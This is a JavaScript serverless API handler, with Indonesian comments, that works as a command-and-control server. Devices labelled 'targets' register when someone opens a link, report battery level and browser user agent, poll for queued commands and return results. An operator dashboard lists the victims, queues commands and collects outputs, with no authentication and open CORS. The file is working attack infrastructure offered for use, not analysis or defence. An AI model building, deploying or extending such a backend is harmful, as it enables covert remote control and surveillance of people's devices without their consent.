let store = {
  devices: {},        // targetId → { online, battery, lastSeen, commands, results }
  commandQueue: {},   // targetId → [{ id, command }]
  resultStore: {}     // targetId → [{ id, result }]
};

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { targetId, action, cmdId } = req.query;
  const body = req.body || {};

  // ===== REGISTER DEVICE (Target panggil pas buka link) =====
  if (req.method === 'POST' && action === 'register') {
    const { battery, ua } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    
    if (!store.devices[targetId]) {
      store.devices[targetId] = { online: true, battery: battery || 0, lastSeen: Date.now(), ua: ua || 'Unknown' };
    } else {
      store.devices[targetId].online = true;
      store.devices[targetId].lastSeen = Date.now();
      if (battery !== undefined) store.devices[targetId].battery = battery;
    }
    return res.json({ status: 'registered' });
  }

  // ===== GET ALL DEVICES (Dashboard) =====
  if (req.method === 'GET' && action === 'devices') {
    const now = Date.now();
    const list = [];
    for (const [id, data] of Object.entries(store.devices)) {
      const online = (now - data.lastSeen) < 15000;
      data.online = online;
      list.push({
        id,
        online,
        battery: data.battery || 0,
        lastSeen: data.lastSeen,
        ua: data.ua || 'Unknown'
      });
    }
    return res.json({ devices: list });
  }

  // ===== SEND COMMAND (Controller → Server) =====
  if (req.method === 'POST' && action === 'send') {
    const command = body.command;
    if (!targetId || !command) return res.status(400).json({ error: 'Missing data' });

    if (!store.commandQueue[targetId]) store.commandQueue[targetId] = [];
    const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    store.commandQueue[targetId].push({ id, command });
    return res.json({ status: 'queued', id });
  }

  // ===== POLL COMMAND (Target → Server) =====
  if (req.method === 'GET' && action === 'poll') {
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    
    // Update last seen
    if (store.devices[targetId]) {
      store.devices[targetId].lastSeen = Date.now();
      store.devices[targetId].online = true;
    }
    
    const commands = store.commandQueue[targetId] || [];
    const command = commands.shift();
    return res.json(command ? { command: command.command, id: command.id } : { command: null });
  }

  // ===== SEND RESULT (Target → Server) =====
  if (req.method === 'POST' && action === 'result') {
    const { id, result } = body;
    if (!targetId || !id) return res.status(400).json({ error: 'Missing data' });
    if (!store.resultStore[targetId]) store.resultStore[targetId] = [];
    store.resultStore[targetId].push({ id, result });
    return res.json({ status: 'received' });
  }

  // ===== GET RESULT (Controller → Server) =====
  if (req.method === 'GET' && action === 'getResult') {
    if (!targetId || !cmdId) return res.status(400).json({ error: 'Missing data' });
    const results = store.resultStore[targetId] || [];
    const idx = results.findIndex(r => r.id === cmdId);
    if (idx !== -1) {
      const result = results[idx].result;
      results.splice(idx, 1);
      return res.json({ result });
    }
    return res.json({ result: null });
  }

  // ===== UPDATE BATTERY (Target → Server) =====
  if (req.method === 'POST' && action === 'battery') {
    const { battery } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    if (store.devices[targetId]) {
      store.devices[targetId].battery = battery;
      store.devices[targetId].lastSeen = Date.now();
    }
    return res.json({ status: 'ok' });
  }

  return res.status(404).json({ error: 'Invalid route' });
}
